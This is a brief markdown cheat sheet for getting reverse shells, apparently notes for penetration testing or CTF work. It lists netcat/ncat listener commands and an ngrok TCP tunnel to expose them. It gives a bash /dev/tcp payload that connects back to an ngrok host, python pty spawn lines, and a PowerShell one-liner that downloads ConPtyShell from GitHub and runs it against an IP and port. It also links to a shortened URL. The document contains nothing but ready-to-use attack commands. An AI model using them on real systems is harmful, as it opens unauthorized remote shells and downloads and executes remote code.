##Open Netcat Server

nc -lv localhost 8782
or
ncat -lvnp 1234
target windows :
stty raw -echo; (stty size; cat) | ncat -lvnp 1337

##Spawn Ngrok Server
ngrok tcp 8782

##Payload Client :
https://www.revshells.com/
or : 
https://bit.ly/3yNL1hg
sh -i >& /dev/tcp/6.tcp.ngrok.io/15060 0>&1


##Spawn TTY
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'

IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.9.1.25 1337
